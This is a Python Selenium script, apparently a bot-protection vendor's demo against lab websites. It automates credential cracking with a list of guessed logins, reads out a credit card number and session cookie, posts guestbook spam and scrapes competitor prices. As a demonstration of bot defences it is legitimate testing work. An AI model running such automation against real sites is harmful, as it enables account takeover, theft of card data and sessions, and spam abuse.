#!/usr/bin/env python
######################################################
## CREATED BY BARTOSZ CHMIELEWSKI                   ##
## bartosz.chmielewski@thalesgroup.com              ##
######################################################
#
# The script uses selenium framework to emulate advanced bot behavior. 
# 
#

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.chrome.options import Options as ChromeOptions
import time


ccounter = 0

def cclogin(login, password, delay=False):
    global ccounter
    ccounter = ccounter + 1
    print('Attempt: ', ccounter, '. Trying username: ', login, ' and password: ', password, '.', sep = '')
    loginform = browser.find_element('id', 'username')
    passwordform = browser.find_element('id', 'password')
    if delay: time.sleep(1)
    loginform.clear()
    loginform.send_keys(login)
    if delay: time.sleep(1)
    passwordform.clear()
    passwordform.send_keys(password)
    if delay: time.sleep(1)
    browser.find_element('id', "loginButton").click()
    if delay: time.sleep(1)

def sendspam(delay, text):
    inputform = browser.find_element('id', 'message')
    if delay == 1: time.sleep(2)
    print("Sending:", text)
    if delay == 1: time.sleep(1)
    inputform.clear()
    inputform.send_keys(text)
    if delay == 1: time.sleep(1)
    browser.find_element('id', "submitEntry").click()
    if delay == 1: time.sleep(2)



while True:
    data = input("Which website you would like to evaluate:\n\n 1) Direct Access (no ABP) \n 2) Protected by ABP\n\n")
    if data == '1':
        url = 'http://direct-lab.spm.pl/'
        break
    elif data == '2':
        url = 'http://lab.spm.pl/'
        break
        
        
while True:
    data = input("Select the browser mode: \n\n 1) Firefox\n 2) Firefox (headless)\n 3) Chrome\n 4) Chrome (headless)\n\n")
    if data == '1':
        print("\nLunching a FIREFOX browser...")
        options = FirefoxOptions()
        browser = webdriver.Firefox(options=options)
        break
    elif data == '3':
        print("\nLunching a CHROME browser...")
        options = ChromeOptions()
        browser = webdriver.Chrome(options=options)
        break
    elif data == '2':
        print("\nLunching a FIREFOX HEADLESS browser...")
        options = FirefoxOptions()
        options.add_argument("--headless")
        browser = webdriver.Firefox(options=options)
        break
    elif data == '4':
        print("\nLunching a CHROME HEADLESS browser...")
        options = ChromeOptions()
        options.add_argument("--headless")
        browser = webdriver.Chrome(options=options)
        break


print("Sending request to the website:", url)
browser.get(url)

time.sleep(2)


#######################################
##### CREDENTIAL CRACKING USE-CASE
#######################################

print("\n\n===CREDENTIAL CRACKING USE CASE===")

print("Browsing to Login Website...")
time.sleep(2)
browser.find_element("id", "loginlink").click()

print("Looks good. I see username and password fields!\n")


cclogin('test1', 'test2', True)
cclogin('john', 'smith', True)
cclogin('stolenusername', 'stolenpassowrd')
cclogin('username', 'easypassword')
cclogin('user', 'Password')
cclogin('testuser', 'testPassword')
cclogin('imperva', 'imperva')
cclogin('john', 'abc123')
cclogin('admin', 'admin')
cclogin('root', 'default')
cclogin('secretuser', 'MyPetsName')
cclogin('chuck', 'norris')
cclogin('bartoszch', 'Test123123#')


print("\n!!! I AM IN! Account hacked !!!")
time.sleep(1)

browser.get(url + "accountinfo")

time.sleep(1)
browser.find_element("id", "RefreshData").click()
time.sleep(1)
ccnumber = browser.find_element('id', 'accountinfo_cc_number')
print("The Credit Card number is:", ccnumber.text)
time.sleep(1)
cookies = browser.get_cookies()
print('The session ID is:', cookies[0]['value'])

input("\nHit Enter when you are ready to move on!")

#######################################
##### SPAMMING USE-CASE
#######################################

print("\n\n===SPAMMING USE CASE===")
print("Lets now send some spam...")

browser.get(url + "guestbook")

sendspam(1, 'This is a spam example [dfghgdfasgtndsdvxvzasdfasfdxz]')
sendspam(1, 'This is another spam example [sgfashgfkshdfjhsfksahskh]')
sendspam(0, 'SPAM: askjhfaskhfxzbewhrkhsgsahwgheagfdasafasgfas')
sendspam(0, 'SPAM: askhgsghfjsdgfergtyuhfergfvdshagfjsgfzjcgsj')
sendspam(0, 'SPAM: tiundkgbskbfhjsabfjsdbsafjkbvdfjvfjvjvsadjv')
sendspam(0, 'SPAM: rtgbishfisgfagsfkgfjsgdhjgfsjgfajegfjsfsauf')
sendspam(0, 'SPAM: sghhgdhjsgfjshabgfhjbgjhgwajhfgajsfjshjzgfj')
sendspam(0, 'SPAM: tguyhgbhdjshgsjfghjsgjhdfzjsghfjsgjshgfsjhg')
sendspam(0, 'SPAM: asgfdsffdkghdskjndfkjghkhkuhzgfkuasukfhkusz')
sendspam(0, 'SPAM: yhilregnjdlhgkushfgskuhkudhfkaushfkaushfkus')
sendspam(0, 'SPAM: cnycksufhkashkasdbfyjgtkshurtishgkaushfkaus')
sendspam(0, 'SPAM: kjkgjdkugfakhfskfbyshkdusghfkahsgkaushfskdf')

time.sleep(1)

print("Done! I've sent some spam. I feel good now!")
input("\nHit Enter when you are ready to move on!")


#######################################
##### SCRAPING USE-CASE
#######################################
print("\n\n===SCRAPING USE CASE===")
print("Lets see what are the prices today...\n")

browser.get(url + "webshop")

time.sleep(2)

browser.find_element("id", "getPriceBtn-1-1").click()
ItemSamsung = browser.find_element('id', 'pricefield-1-1')
print("Samsung Galaxy S26 (black) price:", ItemSamsung.text)

time.sleep(1)

browser.find_element("id", "getPriceBtn-1-2").click()
ItemLenovo = browser.find_element('id', 'pricefield-1-2')
print("Laptop Lenovo T14 Gen4 price:", ItemLenovo.text)

time.sleep(2)
print("\nDone! Now I can update my prices to be a little lower then the competition :)")



input("\n\nI am done. Press Enter to continue...")

